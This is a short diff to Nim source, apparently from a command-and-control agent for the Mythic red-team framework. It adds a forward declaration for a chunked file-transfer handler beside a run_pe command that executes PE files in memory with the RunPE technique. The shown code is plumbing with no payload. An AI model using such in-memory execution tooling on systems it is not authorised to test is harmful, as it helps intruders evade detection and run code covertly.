@@ -542,6 +542,11 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
   except Exception as e:
     return "Error: " & e.msg
 
+# Forward declaration
+proc processRunPeChunk*(taskId: string, params: JsonNode, chunkData: string,
+                        totalChunks: int, currentChunk: int,
+                        fileData: var seq[byte]): JsonNode
+
 proc run_pe*(taskId: string, params: JsonNode): JsonNode =
   ## Execute a PE file in memory using RunPE technique
   ## First response - request the file from Mythic
